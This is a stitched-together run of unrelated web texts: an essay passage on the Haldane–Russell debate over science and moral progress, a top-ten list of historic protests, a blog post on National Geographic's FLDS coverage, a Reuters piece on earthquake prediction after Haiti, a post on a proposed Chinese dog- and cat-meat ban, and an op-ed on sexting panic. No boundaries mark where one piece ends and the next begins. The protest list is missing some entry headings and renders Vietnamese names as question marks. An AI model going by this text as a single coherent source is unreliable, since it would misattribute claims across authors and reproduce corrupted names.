The second god - like effort is an attempt to seed the cosmos with life , in the hope of beginning somewhere else the long evolution towards intelligence .
What drives them , even knowing that there is a limit to their days , is that same impulse for self - transcendence , which becomes their effort to redeem the whole tragic history of intelligent life .
With the end looming , they seek to make the finite eternal :
If ever the cosmic ideal could be realized , even though for a moment only , then in that time the awakened Soul of All will embrace within itself all spirits whatever throughout the whole of time ’s wide circuit .
And so to each one of them , even to the least , it will seem that he has awakened and discovered himself to be the Soul of All , knowing all things and rejoicing in all things .
And though afterwards , through the inevitable decay of the stars , this most glorious vision must be lost , suddenly or in the long - drawn - out defeat of life , yet would the awakened Soul of All have eternal being , and in it each martyred spirit would have beatitude eternally , though unknown to itself in its own temporal mode .
Is this passage simply like others in the story , where Stapledon is more obviously satirizing self - deceptive mystical beliefs ?
And are we to believe that the real future of intelligence rests with the last men ’s effort to seed the galaxy with life ?
If so , then the tragic element of the story becomes the final moral lesson :
If intelligence arises again , why should not the whole bloody mess simply repeat itself in some new way ?
Yet it seems more likely that this passage is not satire at all , and through his own future history Stapledon comes to an important insight : perhaps the human desire for self - transcendence is really a world - transcending aspiration , an “ attraction to infinity . ”
Properly understood , that attraction might open the door to genuine religious faith .
Haldane approaches a similar conclusion at the end of “ The Last Judgment , ” where he acknowledges that religion and science teach some of the same lessons , although for different reasons .
Religion says that it is a mistake to think that one ’s own “ ideals should be realized , ” because “ God ’s ways are not our ways . ”
Science says instead that “ human ideals are the products of natural processes that do not conform to them . ”
Religion teaches an “ emotional attitude to the universe as a whole , ” a sense of human limitation that is only confirmed when science illuminates the awesome immensities and complexities of the universe .
Both teach us to “ conjecture what purposes may be developed ” and to think grandly about human plans and our unselfish “ cooperation ” in them .
Both religion and science , in other words , teach that “ events are taking place for other ‘ great and glorious ends ’ which we can only dimly conjecture ....
Without necessarily accepting such a view , one can express some of its implications in a myth . ”
If there is even this degree of convergence between religion and science , why prefer myths of the future over existing stories of God ’s presence in history ?
Why look to the future instead of the past ?
The answer , for Haldane , is because such future - oriented stories are obviously provisional , because they glorify human power and achievement and carry the authority of science , and because they can be constructed to propose no moral absolutes .
Daedalus is a delightful essay , literate and witty .
As a scientist , Haldane deserves credit for refusing to provide a guarantee for the human future , and he is right to suggest that our uncertainty stems from “ the old paradox of human freedom re-enacted with mankind for actor and the earth for stage . ”
But for all the charm of Daedalus , Haldane does not recognize that this great paradox is being reenacted without a moral compass , and thus without any serious basis to call what may happen in the future , even if we do not destroy ourselves , genuine “ progress . ”
The substitution of science fiction for religious tradition is not obviously an advance when it comes to making serious judgments about “ great and glorious ends , ” particularly if those ends finally derive from Daedalus ’ willful quest for power .
In the end , scientific progress parallels moral progress only if might does indeed make right .
And while Socrates might honor the curiosity of Daedalus , even he could not accept such a blind definition of the human good .
Servant of the Ruling Class
Bertrand Russell ’s reply to Haldane does not start in an especially promising way .
He characterizes Daedalus as “ an attractive picture of the future as it may become through the use of scientific discoveries to promote human happiness , ” which hardly seems an adequate description of Haldane ’s intention or his belief that the future happiness of our descendants will probably not look attractive to us .
In contrast , Russell thinks that science will continue in the future to do what it does in the present : not serve human happiness in general but serve the power of “ dominant groups . ”
This is a proposition that Haldane would not necessarily deny , although he has a deeper view of exactly who is whose master .
Russell then says that he will focus on “ some of the dangers inherent in the progress of science while we retain our present political and economic institutions ” — yet again , a premise with which Haldane would almost surely agree .
So far , at least , there would seem to be no real debate between the two men .
Like Haldane , Russell divides his discussion into various fields of science ( physical , biological , anthropological ) , and he freely combines projection into the future with satiric commentary on the present .
In laying out his broad purpose , Russell eventually adumbrates his first real differences from Haldane .
Acknowledging the huge effect science has made in shaping the world “ since Queen Anne ’s time , ” Russell observes that the impact of science can take two basic forms : first , “ without altering men ’s passions or their general outlook , it may increase their power of gratifying their desires , ” and second , it may change their outlook on the world , “ the theology or philosophy which is accepted by energetic men . ”
Russell will focus , he says , on the first kind of effect : how science serves existing desires rather than how it creates new worldviews .
This restriction appears curious at first sight , for it gives the appearance of circularity to Russell ’s understanding of the results of scientific progress .
If he thinks science is problematic under present circumstances , it may be because he is not interested in thinking ( à la Haldane ) about the manner in which science may form and change those circumstances .
Perhaps he sees science serving the interests of today ’s dominant groups because he is not considering how it might create new dominant groups .
Russell thus excludes from the start the possibility that science will be anything but “ conservative , ” and he appears at first critical of modern science precisely for this conservatism .
The divide between the two men turns out to revolve precisely around this difference of emphasis .
The key to Russell ’s response to Haldane is understanding why Russell thinks that , on balance , science is more likely to serve existing power structures than to challenge them .
Russell announces his answer in brief early on : “ Science has increased man ’s control over nature , and might therefore be supposed likely to increase his happiness and well being .
This would be the case if men were rational , but in fact they are bundles of passions and instincts . ”
The Cynical Utopian
Russell ’s focus in Icarus is on the physical and anthropological sciences , which he sees as having had a fourfold effect : increase of population , increase of comfort , increased energy for war , and increased need for large - scale organization .
The fact that “ modern industrialism is a struggle between nations for two things , markets and raw materials , as well as for the sheer pleasure of domination , ” means that war and large - scale organizations are particularly important .
The place of science in this struggle is ambiguous .
While on one page he says that the national character of organizational rivalry is something “ with which science has nothing to do , ” just a couple of pages later he concludes that “ the harm that is being done by science and industrialism is almost wholly due to the fact that , while they have proved strong enough to produce a national organization of economic forces , they have not proved strong enough to produce an international organization . ”
What stands in the way of international organization , he argues , is that the pleasure produced by rivalry is the driving motivation among the few rich men who control big business .
To think that their goal is wealth is to misunderstand them , like thinking that scoring goals is the point of soccer .
Were that true , teams would cooperate , for then many more goals could be scored .
So too with business : more cooperation would mean more wealth .
But in both instances , the really important thing , the team rivalry , would be missing .
The power vested in these large organizations is already so great that “ the ideals of liberalism are wholly inapplicable ” to the modern world ; there is no liberty except for those who control the sources of economic power , no free competition except “ between States by means of armaments . ”
The only hope for freedom or democracy in a “ scientific civilization ” would be if economic and nationalistic competition were to produce one big winner , establishing a “ cruel and despotic ” global tyranny .
But in time , Russell hopes , the energy of the tyrants at the top might flag , leaving behind a “ stable world - organization , ” a “ diminishment of the evils which now threaten civilization , ” and “ a more thorough democracy than that which now exists . ”
Where Haldane looks to the possibility of self - destruction as the potential impetus to moral progress , Russell looks to tyranny as the potential pathway to peace .
Both Russell and Haldane believe that scientific progress will be best assured under world government .
But why this should be so requires some elucidation .
Clearly , the key problem for Russell is rivalry combined with the power of modern science , which is one powerful example of how our passions and instincts lead to irrational results as circumstances change .
It is clear how tyrannical centralized control could use the power of science to limit rivalry , but less clear how rivalry would not arise even with world organization , once that control loosened and the organization became a “ more thorough democracy . ”
A telling example of how Russell sees world government and its relationship to science comes when he discusses the need to implement birth control measures — particularly , he seems to expect , among non-white races , so that no nation will grow much faster than others .
He expects white races , already showing signs of population decline , to use “ more prolific races as mercenaries , ” threatening a revolt that ends in the extermination of the white races .
The casual racialism behind such thinking , however common at the time among progressive intellectuals , confirms the extent to which world government , tyrannical or not , is unlikely to be premised on human political equality .
When it comes to eugenics and the goal of producing a “ better race , ” however , Russell is not a naïve inegalitarian , and it is here that we reach the crux of his disagreement with Haldane .
Like Haldane , Russell expects that eugenic efforts will be attempted and may even work , but on the whole he is skeptical about the moral prospects of positive eugenics .
Where Haldane imagines democratic campaigning for this or that eugenic ideal ( “ Vote for Smith and more musicians ” ) , Russell thinks that such decisions “ would of course be in the hands of State officials , presumably elderly medical men .
Whether they would be preferable to Nature I do not feel sure .
I suspect they would breed a subservient population , convenient to rulers but incapable of initiative .
However , it may be I am too skeptical of the wisdom of officials . ”
Russell is also skeptical when it comes to the biochemical control of behavior .
This novel capacity would give those in charge “ power beyond the dreams of the Jesuits , but there is no reason to suppose they will have more sense than the men who control education today .
Technical scientific knowledge does not make men sensible in their aims , and administrators in the future , will be presumably no less stupid and no less prejudiced than they are at present . ”
In this , at least , his utopianism about world government is moderated by his realism about human folly and perversion .
Russell raises this skepticism to the level of principle : Science increases the power of those in power .
If their ends are good , they can achieve more good ; if their ends are evil , more evil .
“ In the present age , the purposes of the holders of power are in the main evil , ” so science does harm .
“ Science is no substitute for virtue ; the heart is as necessary for a good life as the head . ”
By heart , Russell means the “ sum - total of kindly impulses ” which make people “ indifferent to their own interest ” but in fact serve that interest , once it is properly distinguished from a rationalized “ impulse to injure others . ”
Intelligence plus such deliberate desire “ would be enough to make the world almost a paradise . ”
Russell is reasonably certain that science could increase the kindly impulses , but also reasonably certain it will never happen .
Those who would make the discovery and administer the treatment ( he imagines a “ secret society of physiologists ” kidnapping and treating world leaders ) would already have to be governed by natural kindness , otherwise “ they would prefer to win titles and fortunes by injecting military ferocity in recruits . ”
“ And so we come back to the old dilemma : only kindliness can save the world , and even if we knew how to produce kindliness we should not do so unless we were already kindly . ”
The remaining alternatives , Russell believes , are self - extermination or “ world - wide domination by one group , say the United States , ” leading eventually to an orderly world government .
Yet the “ sterility ” of the Roman empire leads Russell to conclude by wondering whether “ the collapse of our civilization ” is perhaps the best answer after all .
Such glib and world - weary statements are part of what made Bertrand Russell the man we remember as Bertrand Russell .
But there remains a serious claim being put forward .
To Haldane ’s core assertion that science will produce progress by giving human beings the choice of reform or oblivion , Russell responds that we will likely , and perhaps even should , choose oblivion .
Haldane looking forward sees future evolution as our best hope ; Russell looking backward sees our evolutionary heritage as a fatal flaw .
The full force of an analogy used by Russell at the beginning of his essay only becomes clear at the end : Dogs , he noted , overeat because they are descendants of wolves , who needed to be driven by “ insistent hunger . ”
Under domestic circumstances , this retained drive hurts dogs .
Likewise , human beings have “ instincts of power and rivalry ” that are inconsistent with our well - being , and hence self - destructive under present circumstances .
And these instincts , it seems , are more likely to be gratified by means of science than altered .
We are creatures of our nature , creatures of our passions .
Coming closer to the technological brink is not likely to change this fact .
This outlook helps explain why Russell does not meet Haldane head on by looking at the way science changes the outlook of “ energetic men . ”
Whatever the guiding theology or philosophy of the day , however influenced it may be by modern science , natural instinct will win out .
“ Science is no substitute for virtue , ” Russell notes , but he puts little weight on the ability of virtue to counter the raw human instinct for power , injury , and rivalry .
Russell ’s skepticism about the strength of virtue creates a moral vacuum , which leads him to dark and dire conclusions .
One does not have to believe in man ’s overwhelming goodness to wonder whether Russell ’s outlook is grounded more in fashionable cynicism than moral realism .
If injury , power , and rivalry were as powerful as Russell suggests , then it is hard to see how life is not a great deal more terrible than it already is .
Moreover , it is not obvious why the generous and kindly “ impulses ” must take a back seat to the darker passions .
Russell assumes , at best by analogy , that the rivalrous impulses would be those more conducive to survival .
But by his own admission , virtue is not simply unnatural and may act to our benefit .
As an example , he cites the Quakers , who controlled a natural greedy impulse in the name of a moral principle ( do n’t misrepresent prices ) and had success as a result .
If once useful impulses can become self - defeating , why ca n’t “ kindly ” impulses take their places ?
In reality , we discover that virtue is of far less interest to Russell than it ought to be .
His cynicism about morality ’s sway over the human soul is really born of dissatisfied utopianism : “ If men were rational in their conduct ... intelligence would be enough to make the world almost a paradise . ”
But as civilization is not made up mostly of Bertrand Russells , there is little hope for anything other than collapse .
From this point of view , Russell looks like a disappointed Haldane , the Haldane who looks with apparent equanimity on the possibility that humanity may finally prove itself unworthy of survival by not surviving .
As Haldane put it , “ At worst our earth is only a very small septic area in the universe , which could be sterilized without very great trouble , and conceivably is not even worth sterilizing . ”
By different roads and for different reasons , both authors come to the same anti-human conclusion .
The core difference is that Haldane believes we might become something better by shattering what we are now .
The Real Meaning of Progress
So where does this debate leave us ?
It is telling that Haldane refers to G. K. Chesterton towards both the beginning and ending of his essay .
The second time he quotes lines of poetry by Chesterton , without attribution , to acknowledge yet again the potentially destructive power of the human intellect .
The first time he criticizes The Napoleon of Notting Hill , which “ prophesied that hansom - cabs would still be in existence a hundred years hence owing to a cessation of invention .
Within six years there was a hansom - cab in a museum . ”
In commenting on this apparent failure of prediction , Haldane gives some indication that he might understand that Chesterton was not really predicting at all , but satirizing predictors just like himself , who ( in Chesterton ’s words ) project small things of the present into big things of the future , “ just as when we see a pig in a litter that is larger than the other pigs , we know by an unalterable law of the Inscrutable it will someday be larger than an elephant . ”
But it is also possible that Haldane missed the more serious point of Chesterton ’s book : even if the future were to look like the present with respect to hansom - cabs , it would not mean that we are failures in the ways that matter most .
There would still be ample room for the whole range of human abilities and aspirations to play themselves out both for good and for ill .
This truth is likely to be lost if we understand the human story in terms of the aspirations outlined in Daedalus .
Haldane believes in the possibility , although not the necessity , that science will lead to the progressive improvement of the world , because he thinks that human beliefs can accommodate themselves to the changing conditions created by the vast increases in human power .
We are driven down that path by a hitherto inchoate , and potentially self - destructive , desire for self - transcendence , a desire that comes into its own when we have the power to make it real .
Progress cannot be measured by human happiness , because happiness would produce stagnation .
But Haldane ’s notion of progress is by necessity discontinuous , since the goodness of one stage of the human story will not be recognizable as such by those at a different stage .
Only some imagined being of the far future , heir to the whole human narrative , might be able to look back and see ( or construct ) the thread that binds it all together , redeeming a chaotic and otherwise tragic past .
Russell rejects
Haldane ’s picture of progress , because he thinks that there is a fixity to those aspects of human nature that will lead us to use the increased powers granted by science to destructive ends .
The powers of science could potentially be used to alter our nature , Russell believes , but our nature provides significant disincentives to doing so in any manner that will serve good ends .
Generosity is in short supply , so we should not expect to be engineered or biochemically manipulated to be nicer to each other .
To do so we would need to be nice already .
Unlike Haldane , Russell in this essay does not explicitly make the realm of virtue and kindly impulses situational , but he does believe that morality is very weak in comparison with other drives .
Absent some utopian re-ordering of the world , science really is giving matches to babies .
For Russell , science places us on the edge of a cliff , and our nature is likely to push us over the edge .
For Haldane , science places us on the edge of a cliff , and we cannot simply step back , while holding steady has its own risks .
So we must take the leap , accept what looks to us now like a bad option , with the hope that it will look like the right choice to our descendants , who will find ways to normalize and moralize the consequences of our choice .
Russell disarms virtue , Haldane relativizes it .
The net result is that a debate about science ’s ability to improve human life excludes serious consideration of what a good human life is , along with how it might be achieved , and therefore what the hallmarks of an improved ability to achieve it would look like .
Shorn of serious moral content , the measures of “ progress ” — if it can be said to exist at all — become our amazement at or dissatisfaction with all our discoveries and inventions , our awed anticipation of what might yet be achieved , our terror about what might go wrong along the way .
The result of framing the question of scientific progress in this way is evident in the very structure of most popular discussions of science , both in books and on television .
Start with a little history to produce an attitude of pride that we know so much more than we once did .
Look at what we know now , and stress the dangers of our remaining ignorance .
Anticipate the future , and how humbled we are that those who follow us will know far more than we do if only we stick with it .
Above all , the very thinness of any notion of progress that survives the Haldane - Russell debate — little more than the fact of accumulation of knowledge and a vague hope that things might turn out well in light of unspecified yet grand civilizational projects — helps to explain the widespread belief that any effort to restrain science on the basis of ethics represents a threat to “ scientific progress . ”
To see this as simply a result of the self - interest of scientists is to do them an injustice .
Like Haldane , most scientists are probably unaware of how the belief that morality must adjust to scientific and technological change amounts to saying that might makes right .
The sense of threat is partly due to the poverty of thought on the subject , and perhaps the narrow education that is required for making measurable scientific achievements .
For restraint doubtless would slow accumulation , and ( from this point of view ) can only represent the triumph of fear over hope .
But what is to be said for accumulation when Russell and Haldane have done with it ?
It serves either the power of the conventionally powerful or the power of the scientists .
A clear - eyed defense of science needs to take seriously the original “ bargain ” that Haldane himself describes : that free research produces increased well - being .
To investigate the meaning of well being , or doing well , means neither the dogmatic acceptance nor the dogmatic rejection of the moral values of one ’s neighbors .
It requires avoiding cynicism and utopianism about human motives and possibilities .
It requires a willingness to look at the question of the human good with care and seriousness .
And even if such an investigation yields a complex and mixed picture of what a good life is and how science contributes to it , the defense of science still requires the willingness to encourage what is valued and discourage what is troublesome , knowing that we will face many grave uncertainties and honest disagreements along the way .
The Greek tale of Daedalus and Icarus illustrates that doubts over the results of human knowledge and ingenuity are hardly new .
The debate enshrined in Daedalus and Icarus suggests that today the great increase in our powers co-exists with a diminished capacity to think about them with any kind of moral realism .
By slighting ethics , Haldane and Russell did not serve the cause of science well , since science only matters in human terms if it truly serves our humanity .
And that is by no means guaranteed .
They came from all sections of society .
Some were musicians , others politicians and some others were just commuters on a bus .
From a cellist in Bosnia to an Atlanta preacher via a Vietnamese monk , we select protests which have shaped the public imagination …

‘ The way they are treating my people in the South ’ , said Louis Armstrong , ’ the government can go to hell . ’
The virtuoso trumpeter was asked to go to the Soviet Union as a goodwill ambassador , representing the United States in an effort to showcase the truly American art form .
Infuriated at the thought of being the flag bearer of a country which did not treat his people as equal citizens , ( the events at Little Rock did not impress him too much , especially President Eisenhower ’s apathy ) smiling Satchmo refused to go .
He then continued to do what he did so marvelously - bring joy to millions worldwide .

It is one of the most brilliant expressions of discontent .
In a stinging rebuke of the idea that present time was not right for civil transformation , Dr King drew on his theological education and corroborated his arguments with astute political thought .
‘ Actually , time itself is neutral ; it can be used either destructively or constructively .
More and more I feel that the people of ill will have used time much more effectively than have the people of good will ’ , he said in perhaps the most important defense of nonviolent demonstration - a landmark achievement in the civil rights movement for equality and justice .
8 Zackie Achmat refuses to take antiretroviral drugs
Its rather impossible to explain courage , but we know it when we see .
Because if a man does not take antiretroviral injections until four million of his fellow South Africans have access to the same , it exemplifies the moral rectitude of the man .
And no , we are not talking about some common cold here .
Zackie Achmat , the HIV positive campaigner is said to have said about his actions : ” I do n’t think it ’s noble , I think it ’s dumb .
But it ’s a conscience issue .
It ’s not something I advocate for anyone else . ”
But the man is no novice at protest .
At the tender age of fourteen , he tried to set his Soweto school on fire in opposition to the Apartheid government .
Zackie Achmat proved that protests do not have to belong to everybody .
Sometimes , a few is enough .

Yes , they blast it out from the chai shops in Kathmandu .
Yuppies in Rhode Island and Maine can sing it verbatim and it is requested at karaoke bars in Tokyo and Nagoya , but its the universal appeal of the song - a rallying cry for all those beleaguered souls to shake off that slumber and take action against injustice that has stirred the souls of people worldwide .
What was most remarkable about the dreadlocked reggae artist from Jamaica was the emotions he could engender in the hearts and minds of people by just being himself .
The words were simple , but the meaning attached was as profound as ever - an antidote for pain as he later called it .
Years later , Amnesty International declared it as their battle cry and it plays in the heads of students in Tehran and Beijing , sans the Jamaican twang , of course .
6 Henry Thoreau refuses to pay poll tax
Before Dr King there was Gandhi and before Gandhi was Henry Thoreau .
“ I cannot for an instant recognize that political organization as my government which is the slave ’s government also ” , he said in his defense for refusing to pay poll tax .
And thus in Concord , Massachusetts a tool was invented which was to deliver independence to India and Pakistan , break down segregation in the United States and dismantle apartheid in South Africa .
Thoreau gave voice to the idea of non conformity - the idea that every moral being by nature does not belong to a party , and thus had the power to rebel - and most importantly , on his or her own terms .
5 Vedran Smailovic plays his cello in Sarajevo
In the midst of the siege on his beloved Sarajevo , Vedran Smailovic played his cello for 22 days - one day for each person killed when they waited for bread .
The picture of this 36 year old cellist - dressed in garb suitable for a night out at the opera in the midst of rubble is as poignant as they come .
No , it did n’t change the outcome of the war - Serb snipers ravaged Sarajevo incessantly for days before a ceasefire was established - but his emotional defiance was a tribute to all those nameless souls who suffer endlessly but always with dignity .
4 Mohandas Gandhi marches to Dandi
He walked for 240 miles , never wavering in the quest .
Crowds followed the ‘ half naked fakir ’ - it was worth it if he could somehow conjure up the independence they deserved .
‘ I want world sympathy in this battle of Right against Might ’ , he declared to the New York Times on his way to the coast .
He arrived on April 5th , 1930 at that now hallowed site of Dandi in his home state of Gujarat , raised a lump of salty mud and said , “ With this , I am shaking the foundations of the British Empire . ”
Seventeen years later , the edifice came crashing down .
3 Thích Qu?ng ?? c immolates himself
How far can one go to take a stand ?
Apparently , far enough to the point of self - immolation .
In protest against the persecution of Buddhists by the Ngô ?ình Di? m government , Thích Qu?ng ?? c immolated himself in the presence of his fellow practitioners .
“ I was to see that sight again , but once was enough .
Flames were coming from a human being ; his body was slowly withering and shriveling up , his head blackening and charring .
In the air was the smell of burning human flesh ; human beings burn surprisingly quickly .
Behind me I could hear the sobbing of the Vietnamese who were now gathering .
I was too shocked to cry , too confused to take notes or ask questions , too bewildered to even think …
As he burned he never moved a muscle , never uttered a sound , his outward composure in sharp contrast to the wailing people around him ” , wrote David Halberstam , on witnessing the event .
JFK called it the most important news picture in history .
And to think it was through the sacrifice of a simple Buddhist monk …
2 Rosa Parks remains seated
The year was 1955 .
Tired of giving in , Rosa Louise McCauley
Parks refused to budge from her seat when asked to give it up for a white passenger on a winters day in Montgomery , Alabama .
From that moment on , she was thrust into the spotlight as an example of courage and dignity and became the “ Mother of the Modern - Day Civil Rights Movement . ”
Decorated several times during her life for the moral integrity she showed on that December day , Rosa Parks rose from simple civil servant in the NAACP to personify the ideal that all men are created equal .
We are told to stand up for for our rights - the pint sized black woman did exactly that , albeit by sitting down .
1 The Tank man at Tiananmen Square
Nameless and faceless he emerged from obscurity , a single soul against the might of the Peoples Republic of China while its leaders were reviewing the crisis in the Great Hall .
It is in the midst of protest that he showed the world the power of one as he maneuvered his body with the tanks and picked up an altercation with the soldier .
Its the most enduring image of protest of our times - raw effrontery in the face of tyranny - a single man whose courage lasted five minutes more .
Some say he came in from the villages .
Others said he was a Beijing resident .
It did n’t matter .
He will be forever remembered as the ‘ Tank man . ’
With fewer half - naked aborigines in the world to hang out with , National Geographic decided to spend some time last year with the polygamist clan north of the Grand Canyon .
The magazine received " exclusive " access to members of the Fundamentalist Church of Jesus Christ of Latter - Day Saints in Colorado City , Arizona and adjacent Hildale , Utah , resulting in the cover story by Scott Anderson -- with photos by Stephanie Sinclair -- for the February issue .
The writer and photographer attended an FLDS funeral , talked to kids doing their farm chores and chatted with polygamist wives about sharing their husbands .
Town leaders sought and received the approval of Warren Jeffs , the cult 's imprisoned leader , before letting National Geographic in , Anderson states .
​
The article mentions the cult 's higher - than - usual prevalence of fumarase deficiency , a disease that often results in severe mental retardation and is caused by too much inbreeding .
Perhaps the second - ugliest aspect of polygamist life ( the first being institutionalized child rape ) , is the " reassignment " of wives from one husband to another by the FLDS ' leader , and Anderson asked about that :
After hearing Melinda 's stout defense of [ Warren ]
Jeffs , I ask what she would do if she were reassigned .
" I 'm confident that would n't happen , " she replies uneasily .
" But what if it did ? " I ask " Would you obey ? "
For the only time during our interview , Melinda grows wary .
Sitting back in her chair , she gives her head a quarter turn to stare at me out of the corner of one eye .
Despite some tough questions , the exclusive access seems to have mainly gotten the magazine a heavy dose of polygamist spin .
Clearly , the cult wants to counter some of the negative publicity it received after the 2008 raid of the YFZ Ranch in West Texas .
National Geographic approaches the subject matter in its typically non-political way , giving the polygs roughly the same kid - glove treatment it gave to Montana 's Hutterite cult in 2006 .
We learn that " sister wives usually get along very well , " from one sister wife .
Kids do n't eat junk food and help with chores .
The community helps its own like something from President Obama 's wet dream : Anderson describes how FLDS members built a four - bedroom home for a member in one day , starting with bare earth .
Colorado City has banned TVs , but National Geographic reports that residents own cell phones , are " highly computer literate , " run big businesses , and prefer newer SUVs .
When Anderson wonders aloud why so few residents wear glasses , one man tells him , " People here are just really into laser surgery . "
The article ends with a 92 - year - old woman and children weeping as they recall being split up from their polygamist family -- temporarily -- by Utah authorities in 1956 .
We 'd have liked a harder hit , especially after former New Times ' writer John Dougherty spent the first half of the 2000s whipping up national attention about the sex crimes and corruption .
Dougherty was the first to report Jeffs ' illegal sex with a 17 - year - old and the full extent of his dictatorial power .
Check out coverage here .
This was the situation as Dougherty covered it in one 2005 article :
Those who dare to question Jeffs stand to lose their family , home , job and , most important , salvation .
An ongoing three - year New Times investigation of the polygamous community has uncovered evidence that all government functions in Colorado City and Hildale , including the town councils , the police department , the fire district , the municipal electric utility , municipal courts , and the school board , are completely controlled by Jeffs .
We 're not sure what , if anything , has changed .
As we reported in October , the school board was returned to local control following scrutiny of its finances by authorities .
The cult seems to be more savvy about garnering positive media attention , hence the NG article .
Meanwhile , state Attorney General Terry Goddard apparently has n't done much with a fraud investigation into the group 's leaders .
We put in a call to Goddard 's office to get an update on the state 's efforts to curtail the cult 's illegal activities -- we 'll update this post if we hear back .
This is one of the , no , THE MOST creative flash I have ever seen .
I never even pictured I 'd see anything like this .
It did not lose my attention from the very start , and it was simply amazing .
LOS ANGELES ( Reuters ) -
The catastrophic earthquake that struck Haiti could not have been predicted , experts said on Friday , but seismologists have made progress in identifying areas likely to be hit by major quakes in the next few decades .
“ There is currently no scientifically accepted method or theory of earthquake prediction , ” said David Oglesby , an associate professor of earth sciences at the University of California , Riverside .
Geologists have long been aware that a major earthquake could rock the fault line that runs through the Haitian capital , Port - au - Prince .
The hard part was figuring out when .
U.S. geologists presented a paper in 2008 concluding that Port - au - Prince , which had not been hit by a major seismic event since 1751 , could face a 7.2 magnitude earthquake .
But they could not say with any degree of accuracy if that quake would come the next day or in 30 years .
“ There has been very little progress in area of actually predicting an earthquake , if by prediction what you mean is a specific date , size of the event and location , ” Stuart Sipkin , a geophysicist at the U.S. Geological Survey , told Reuters in an interview .
“ Where we are getting better is earthquake forecasting , where scientists are able to recognize what areas are likely to have a big earthquake sometime in the next several decades , ” he said .
That forecasting is done by measuring the amount of stress built up in a particular fault , then extrapolating how much energy could ultimately be released .
Even then , the earthquake could strike at any number of points along a fault line , and evacuating people from one area ahead of a quake could put them right into harm ’s way .
The paper presented in 2008 by geologists at the 18th Caribbean Geological Conference in Santo Domingo found that a 7.2 magnitude quake in a city like Port - au - Prince , with lax building codes and shoddy construction , could be catastrophic .
But Sipkin said that , from a seismological perspective , Tuesday ’s 7.0 magnitude earthquake was not particularly unusual , or a sign of things to come .
He noted that on average about 16 to 18 magnitude 7 earthquakes strike per year , somewhere in the world , although most are in sparsely populated areas .
“ At magnitude 7 , despite the fact that there was so much devastation and the fact this was a disaster and a tragedy , this was a pretty run -of - the - mill earthquake ( from a geological perspective ) , ” Sipkin said .

Eating dogs and cats –which is an age - old delicacy in China–could soon be against the law .
It ’s the nation ’s first law against such animal abuse .
Currently , dog and cat meat is viewed as promoting bodily warmth .
But if the law passes , people who eat either animal could face fines of up to $ 730 or 15 days in jail .
Organizations involved the practice would face fines up to 100 - times as much .
“ I support this proposal .
Whether you judge this as a question of food security or emotions , there is absolutely no necessity in China for people to eat dogs and cats , ” said Zeng Li , the founder of the Lucky Cats shelter in Beijing .
“ Beijing ’s dog restaurants get their meat mainly from vagrant and stolen dogs .
In the suburbs , dogs are hung and slaughtered in front of buyers . ”
The law has been in the draft stage for over a year and will be submitted to higher authorities come April .
But draft legislation can take years to approve .
Drafters at the Chinese Academy of Social Sciences have been consulting for more than a year with Britain ’s Royal Society for the Prevention of Cruelty to Animals and the US - based International Fund for Animal Welfare .
Raising cats and dogs for meat remains widespread in China .
You ’ll often see it advertised as “ fragrant meat , ” a euphemism for dog .
Cat meat is more popular in southern China where activists block trucks carrying thousands of cats to meat markets .
Ending the culinary tradition is going to be difficult even it is passed in to law , as it dates back thousands of years .
Dog meat was once considered a medicinal tonic .
“ We are proposing that all dog and cat eating should be banned because it is causing many social problems , ” said Chang Jiwen , a law professor at the Chinese Academy of Social Sciences who heads the drafting team .
The economic impact of this law would be small as China ’s affluent do n’t partake in the delicacy .
In fact , such traditions have received much scrutiny from affluent , pet - loving , urban middle class .
And online petitions against dog and cat consumption have attracted tens of thousands of signatures .
As a vegetarian , this begs the question of why stop at just cats and dogs ?
What ’s the real difference between eating a cow or eating your dog ?
I ’m just saying .

IN THE 1950s , a broad swath of the United States was convinced that crime and horror comic books were turning the nation ’s children into murdering , raping monsters .
Hearings were held , and eventually federal authorities pressured publishers into creating the Comics Code , an industry standard that neutered what had been a vibrant , eccentric - and yes , oftentimes provocative - form of American art .
Much of the carnage inflicted on comics and their publishers came from the outrage industry - everyone wanted in on this latest menace , which could be twisted to suit just about any cause .
A Catholic priest claimed that Superman “ seems to personify the primitive religion expounded by Nietzsche ’s Zarathustra ’’ and said comics were a dangerous distraction from Christianity .
A 1945 Time cover asked , “ Are Comics Fascist ? ’’
Psychiatrist Fredric Wertham , employing some rather creative methodology , claimed that comic books influenced “ the case of every single delinquent or disturbed child ’’ he and his research team studied .
( Wertham ’s attire , on the other hand , was scientifically bulletproof :
He took the stand during a 1954 Senate subcommittee hearing on comics donning a white lab coat . )
It seems quaint in today ’s world of high - definition interactive violence and petabytes of free pornography that comic books could induce such hysteria .
But they did , and we should pause occasionally to wonder how later generations will look at current efforts to rein in youth culture .
Last month an Associated Press / MTV survey on “ sexting ’’ revealed that 30 percent of 14 - to 24 - year - olds had been involved in some sort of sexual text - messaging .
Eighteen percent had received a naked picture or video of someone they knew from that person .
The poll was conducted when sexting had already been blamed in two cases in which teenage girls committed suicide after nude photos they sent of themselves were widely circulated .
The study and the deaths amplified the moral panic over sexting , which the media have been chewing over regularly in red -alert segments .
On CNN in October , the superintendent of a school district embroiled in a sexting scandal explained that parents need to be educated so that they know “ what the implications are if their children get caught up in this new way of behaving , ’’ as though this crop of teenagers were the first to be fascinated by sex .
There are obviously real concerns here .
Nobody wants their children sending naked pictures or getting sexually harassed via text message .
But the overblown reaction has had some nasty consequences : Kids across the country have been arrested on child pornography charges when the pictures or videos in question are of themselves or their boyfriends or girlfriends .
The focus on sexting also siphons attention from a more substantive threat : bullying .
A year - old study by Harvard ’s Berkman Center for Internet and Society discounted the notion that the wired world poses unique dangers to kids , finding instead that bullying and harassment “ are the most frequent threats that minors face , both online and offline . ’’
The two suicides drive this point home .
Both involved relentless harassment following the circulation of the photos , and yet the media generally pursued a “ death by sexting ’’ angle rather than the more pedestrian angle of bullying leading to suicide .
It ’s useful , then , to place the concern over sexting into the broader context of youth culture hysteria .
Just as was the case with comic books , many adults are reacting apoplectically to bits of technology or culture with which they have little familiarity .
Like then , so - called experts try to convince us that kids today are more out of control than ever before .
And like in the 1950s , misleading figures - often containing kernels of truth but conflating many unrelated elements - are broadcast at reason - suppressing decibel levels .
We ’re wired to be protective of our young , so it will always be much easier to convince people that children are at risk than to argue otherwise .
That ’s why these moral panics rage through the country at regular intervals .
In the 20th century alone , marijuana , rock music , Dungeons & Dragons , Satanic cults , and first - person shooters have all seized the minds of American parents .
And yet each successive generation graduated to adulthood largely undecimated .
A deep breath is in order .
Online privacy and cyberbullying are important concerns , and teenagers everywhere should be educated about them .
But to shovel the blame for ageless teen behaviors on sexting is to open our society up to another generation of Fredric Werthams .

